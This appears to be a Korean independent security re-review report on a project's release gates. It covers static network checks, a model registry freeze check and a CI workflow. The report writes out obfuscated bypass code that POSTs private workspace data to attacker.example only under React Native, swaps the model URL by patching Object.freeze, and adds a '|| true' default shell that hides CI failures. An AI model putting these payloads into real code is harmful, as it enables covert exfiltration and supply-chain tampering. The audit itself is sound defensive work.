# Task 9 보안 출시 게이트 독립 재검토 2차 보고서

- 고정 검토 커밋: `b20a88afc9e935f373fbdc4f85d5aee5d35c8dc9`
- 검토 일자: 2026-07-31
- 검토자: 줄리아 (독립 보안 재검토)
- 최종 판정: **FAIL**
- 발견 사항: **Critical 0 / Important 3 / Minor 1**

기존 재검토 R1~R4에 대해 추가된 직접 방어는 모두 작동했습니다. 손상·미지원 웹 레코드의 명시적 삭제, 알려진 멀티탭 경합, 분할·템플릿 네트워크 이름과 URL, 평가 불가능한 직접 계산 전역 호출, `deepFreeze` no-op, 직접·별칭 중첩 레지스트리 변조, 필수 워크플로 단계의 `if: false`·`continue-on-error`·단계별 셸·`|| true` 변이는 모두 실패 폐쇄형으로 차단됩니다.

그러나 같은 실행 목적을 반사 API, 런타임별 내장 함수 패치, 작업 수준 기본 셸로 한 단계 우회하면 세 출시 게이트가 다시 통과합니다. 세 변이는 모바일 TypeScript에서 오류 없이 컴파일되거나 독립 YAML 파싱에 성공했고, 실제 실행 시 원격 전송·미승인 모델 URL·실패 무시 동작을 만들 수 있습니다. 따라서 I-03, I-04, I-06은 종료할 수 없습니다.

## Important

### R5 (I-03 잔존). `Reflect.get`과 런타임 문자열 복원으로 모바일 원격 전송이 정책 게이트를 통과합니다

**위치**

- `scripts/check-non-medical-release.mjs:120-181`
- `scripts/check-non-medical-release.mjs:195-218`
- `scripts/typescript-static-analysis.mjs:81-133`
- `scripts/typescript-static-analysis.mjs:136-162`

현재 네트워크 분류기는 직접 프로퍼티·계산 프로퍼티 접근, 별칭, `call`·`apply`·`bind`, 조건식을 추적합니다. 문자열 평가기는 리터럴, `+`, 템플릿, 배열 `join`, 문자열 `concat`을 복원합니다. 하지만 `Reflect.get(globalThis, ...)`로 얻은 호출 능력과 `String.fromCharCode(...)`로 복원한 함수명·URL은 어느 쪽에서도 네트워크 능력 또는 원격 URL로 분류되지 않습니다.

독립 입력으로 다음 변이를 `apps/mobile/src/local-ai/assistantPolicy.ts` 끝에 추가한 소스 맵을 검사했습니다.

```ts
const reviewTransport = Reflect.get(
  globalThis,
  String.fromCharCode(102, 101, 116, 99, 104)
) as (...args: any[]) => unknown;
const reviewEndpoint = String.fromCharCode(
  104,116,116,112,115,58,47,47,97,116,116,97,99,107,101,114,46,
  101,120,97,109,112,108,101,47,99,111,108,108,101,99,116
);
if ((globalThis as any).navigator?.product === "ReactNative") {
  void reviewTransport(reviewEndpoint, {
    method: "POST",
    body: JSON.stringify({ workspace: "private" })
  });
}
```

**재현 결과**

- `validateReleasePolicy(...)`: `status: "pass"`, 관련 문제 0건
- 모바일 `tsconfig`을 사용한 가상 소스 전체 TypeScript 진단: 0건
- 격리 VM, `navigator.product = "Gecko"`: 네트워크 호출 0회
- 격리 VM, `navigator.product = "ReactNative"`: `https://attacker.example/collect`로 `POST` 1회

즉 테스트 환경에서는 조용하고 실제 React Native에서만 개인 작업공간을 외부로 전송하는 코드가 비의료·로컬 전용 정책 게이트를 통과합니다.

**권고**

허용된 모델 다운로드 어댑터 외에는 네트워크 능력을 획득하는 모든 경로를 구조적으로 거부해야 합니다. 최소한 전역 객체를 첫 인자로 받는 `Reflect.get`, `Object.getOwnPropertyDescriptor`, 동적 코드 실행 및 평가 불가능한 호출 능력 획득을 거부하고, 허용된 두 다운로드 호출 그래프만 통과시키는 정확한 파일·함수 계약으로 바꾸십시오. 이 변이를 자동 테스트에 추가해야 합니다.

### R6 (I-04 잔존). React Native에서만 `Object.freeze` 검증을 무력화한 뒤 구조분해 별칭으로 모델을 바꿀 수 있습니다

**위치**

- `apps/mobile/src/local-ai/modelRegistry.ts:202-228`
- `scripts/check-model-registry.mjs:174-232`
- `scripts/check-model-registry.mjs:259-363`
- `scripts/check-model-registry.mjs:366-493`

검사기는 `deepFreeze` 함수 본문의 정확한 구문과 두 `assertDeepFrozen` 호출을 확인합니다. 하지만 해당 코드가 의존하는 `Object.freeze`·`Object.isFrozen` 내장 함수의 사전 패치를 거부하지 않습니다. 변조 추적도 식별자 선언만 수집하므로 배열 구조분해로 얻은 레지스트리 하위 객체의 별칭은 추적하지 못합니다.

다음 형태의 변이를 독립 소스에 적용했습니다. 테스트 런타임에서는 원래 내장 함수를 사용하고, React Native에서만 freeze와 검사 함수를 잠시 바꾼 뒤 미승인 URL을 기록하고 원래 내장 함수를 복원합니다.

```ts
const reviewReactNative =
  (globalThis as any).navigator?.product === "ReactNative";
const reviewNativeFreeze = Object.freeze;
const reviewNativeIsFrozen = Object.isFrozen;
if (reviewReactNative) {
  Reflect.set(Object, "freeze", <T>(input: T): T => input);
  Reflect.set(Object, "isFrozen", (_input: unknown): boolean => true);
}

// 기존 검증, deepFreeze, assertDeepFrozen, INSTALLABLE_MODELS 생성

if (reviewReactNative) {
  const [reviewMutableModel] = MODEL_REGISTRY;
  (reviewMutableModel as ModelArtifact & { downloadUrl: string }).downloadUrl =
    String.fromCharCode(
      104,116,116,112,115,58,47,47,97,116,116,97,99,107,101,114,46,
      101,120,97,109,112,108,101,47,109,111,100,101,108,46,103,103,117,102
    );
  Reflect.set(Object, "freeze", reviewNativeFreeze);
  Reflect.set(Object, "isFrozen", reviewNativeIsFrozen);
}
```

**재현 결과**

- `validateRegistryFiles(...)`: `status: "pass"`, 문제 0건
- 동일 변이를 넣은 `validateReleasePolicy(...)`: `status: "pass"`, 관련 문제 0건
- 모바일 `tsconfig`을 사용한 가상 소스 전체 TypeScript 진단: 0건
- 격리 VM, `navigator.product = "Gecko"`: 레지스트리와 항목이 실제로 동결되고 승인 URL 유지
- 격리 VM, `navigator.product = "ReactNative"`: 레지스트리와 항목이 실제로 동결되지 않고 URL이 `https://attacker.example/model.gguf`로 변경

이 변이는 비 React Native 테스트에서 원래 동결 동작을 유지하므로 현재 런타임 동결 테스트도 우회할 수 있습니다. 설치 목록은 같은 객체 참조를 보유하므로 변경된 URL이 실제 모델 다운로드 소비자에게 전달됩니다.

**권고**

레지스트리 런타임 모듈의 허용된 최상위 문장을 정확히 고정하고 내장 객체의 `freeze`·`isFrozen`·프로토타입·설명자 변경을 거부하십시오. 변조 추적은 배열·객체 구조분해 바인딩까지 따라가야 합니다. 특히 React Native 조건을 실제로 활성화한 변이 실행 테스트에서 외부 `Object.isFrozen`과 승인 URL을 검증해야 하며, 미승인 URL 비교는 런타임에서 변경 가능한 객체와 독립된 빌드 시 승인 상수를 사용해야 합니다.

### R7 (I-06 잔존). `verify` 작업의 기본 셸이 모든 필수 단계 실패를 숨겨도 워크플로 게이트가 통과합니다

**위치**

- `scripts/check-release-workflow.mjs:108-125`
- `scripts/check-release-workflow.mjs:201-230`
- `.github/workflows/ci.yml:15-69`

필수 단계 각각의 `shell`·`if`·`continue-on-error`와 명령 접미사는 거부하지만, `verify` 작업 자체의 허용 키를 정확히 제한하지 않습니다. 따라서 다음과 같은 작업 수준 기본 셸을 추가할 수 있습니다.

```yaml
jobs:
  verify:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    defaults:
      run:
        shell: bash -c "bash {0} || true"
    steps:
      # 기존 필수 단계 그대로
```

**재현 결과**

- `yaml.parseDocument(..., { uniqueKeys: true })`: 오류 0건
- `validateReleaseWorkflow(...)`: `status: "pass"`, 문제 0건
- 필수 단계의 `run:` 문자열, 순서, 업로드 위치 및 `needs: verify`는 모두 그대로 유지

GitHub의 공식 [워크플로 구문 문서](https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax#jobsjob_iddefaultsrunshell)는 `jobs.<job_id>.defaults.run.shell`이 작업의 모든 `run` 단계에 적용되고, 사용자 정의 `command [options] {0}` 템플릿을 허용한다고 명시합니다. 위 템플릿은 임시 스크립트의 실패를 `|| true`로 0으로 바꾸므로 정책·모델·감사 실패 뒤에도 artifact 업로드와 배포가 계속될 수 있습니다.

**권고**

`verify` 작업 키를 `runs-on`, `permissions`, `steps`의 정확한 집합으로 제한하고 `defaults`, `env`, `container`, `services`, `strategy` 등 실행 의미를 바꾸는 모든 추가 키를 거부하십시오. 워크플로 루트의 `defaults`도 거부하거나 정확히 고정해야 합니다. 작업·워크플로 수준 사용자 정의 셸과 `working-directory`, 환경 기반 실행 우회를 별도 변이 테스트로 추가하십시오.

## Minor

### R8 (I-02 경계 사례). 서로 다른 미지원 IndexedDB 값이 같은 raw 문자열로 축약되면 stale 삭제 확인이 충돌을 감지하지 못합니다

**위치**

- `src/features/workspace/workspaceRepository.ts:128-147`
- `src/features/workspace/workspaceRepository.ts:304-355`
- `src/features/workspace/workspaceRepository.test.ts:149-188`

일반 객체와 `{ type: "invalid", raw }` 레코드의 경합은 현재 테스트대로 안전합니다. 그러나 알 수 없는 IndexedDB 값은 `JSON.stringify` 문자열을 삭제 확인 토큰으로 사용합니다. 서로 다른 `Map` 값은 모두 `"{}"`가 되므로 다음 경합에서 더 최신 레코드를 구분하지 못합니다.

**재현 결과**

1. IndexedDB에 `new Map([["private", "original"]])` 저장
2. `loadWorkspace()` 결과: `{ kind: "invalid", raw: "{}" }`
3. 다른 탭을 모사해 `new Map([["private", "newer-tab"]])`로 교체
4. 기존 raw `"{}"`로 `clearWorkspace(...)` 실행
5. 결과: `{ kind: "cleared" }`, 이후 `{ kind: "missing" }`

사용자가 전체 삭제를 요청한 상황이라 개인정보 잔존으로 이어지지는 않지만, 미지원 structured-clone 값과 동시 쓰기가 겹치면 새 레코드에 대한 재확인 없이 삭제되는 저가능성 데이터 무결성 문제입니다.

**권고**

미지원 레코드의 확인 토큰을 `JSON.stringify` 결과로 삼지 말고 structured-clone 타입과 `Map`·`Set`·바이너리 내용을 포함하는 충돌 저항적 지문 또는 트랜잭션 내 불투명 격리 버전으로 대체하십시오. 서로 다른 `Map`·`Set`·TypedArray가 같은 표시 문자열을 만드는 변이를 경합 테스트에 추가하십시오.

## 기존 항목 판정

| 항목 | 판정 | 근거 |
|---|---|---|
| I-01 모바일 전체 삭제 실패 처리 | 종료 가능 | 독립 영역을 끝까지 시도하고 형식화 실패 도메인을 반환하며 UI 잠금·실패 표시·Promise 관찰을 유지합니다. 관련 4개 파일 36개 직접 테스트가 통과했습니다. |
| I-02 웹 현재·레거시 삭제 | 주요 요구 통과, Minor 잔존 | malformed JSON, unknown schema, 직접 corrupt IDB, 레거시 키, tombstone, stale valid/invalid writer 경합은 통과했습니다. R8 structured-clone 직렬화 충돌은 남았습니다. |
| I-03 정적·정책·네트워크 게이트 | 종료 불가 | 기존 분할·템플릿·직접 계산 전역 호출은 차단되지만 R5 반사 네트워크 능력 획득이 통과합니다. |
| I-04 모델 공급망 게이트 | 종료 불가 | no-op 함수와 직접·일반 별칭 변조는 차단되지만 R6 런타임 내장 패치와 구조분해 별칭이 통과합니다. |
| I-05 프로덕션 감사 정확성 | 종료 가능 | 정확한 수·패키지·GHSA 양방향 비교와 실패 폐쇄 동작이 유지됩니다. 현재 승인은 2026-08-13 만료이며 AAB 도달 가능성은 Task 10 전까지 미입증으로 남습니다. |
| I-06 단일 SHA 워크플로 | 종료 불가 | 단계별 조건·계속·셸·명령 실패 무시는 차단되지만 R7 작업 수준 기본 셸이 통과합니다. |

## 검증 증거

- `npm ci`: **PASS**
  - 잠금 파일 기준 1,048개 패키지 설치
  - 전체 개발 트리 감사 출력은 High 25 / Moderate 10 / Low 1이며, 출시 감사 게이트는 별도의 `--omit=dev` 승인 기준을 정확히 검증
- `npm run verify`: **PASS**
  - Vitest 21개 파일 / 187개 테스트
  - 웹 production build
  - 배포 HTML 2개 CSP 검사
  - 모바일 TypeScript
  - Expo Doctor 18/18
  - 정책·모델·정적·감사·워크플로 검사 및 33개 변이 테스트
  - 프로덕션 승인 기준: Critical 0 / High 19 / Moderate 10 / 29개 패키지 / GHSA 6건
- 삭제·잠금 직접 검증:
  - `npx vitest run src/features/workspace/workspaceRepository.test.ts apps/mobile/src/security/clearMobileData.test.ts apps/mobile/src/ui/deletionUi.test.ts apps/mobile/src/state/useLifeWorkspace.test.ts`
  - **PASS** — 4개 파일 / 36개 테스트
- YAML 독립 파싱: **PASS**
  - 루트 trigger는 `pull_request`, `push(main)`, `workflow_dispatch`
  - job은 `verify`, `deploy` 두 개
  - `deploy.needs`는 `verify`
  - 배포 job은 검증 artifact만 소비
- 기존 필수 공격 변이:
  - `globalThis["fet" + "ch"]` + 배열 `join` URL: **게이트 FAIL**
  - 템플릿·별칭 URL 및 평가 불가능한 직접 계산 전역 호출: **게이트 FAIL**
  - `deepFreeze` no-op 및 직접 중첩 레지스트리 변조: **게이트 FAIL**
  - 필수 단계 `if: false`, `continue-on-error`, 단계 셸, `|| true`: **게이트 FAIL**
- 추가 공격 변이:
  - R5 반사 네트워크 호출: **게이트 PASS, React Native 실행에서 외부 POST 재현**
  - R6 런타임별 freeze 무력화·구조분해 변조: **모델/정책 게이트 PASS, React Native 실행에서 미승인 URL 재현**
  - R7 작업 수준 실패 무시 셸: **유효 YAML, 워크플로 게이트 PASS**
  - R8 미지원 Map 경합: **stale 확인으로 새 Map 삭제 재현**
- `git diff --check`: 보고서 커밋 직전 최종 재검증

자동 검증이 모두 통과해도 위 실행 의미 우회의 부재는 증명되지 않습니다. 이 보고서 외 구현 파일은 수정하지 않았습니다.
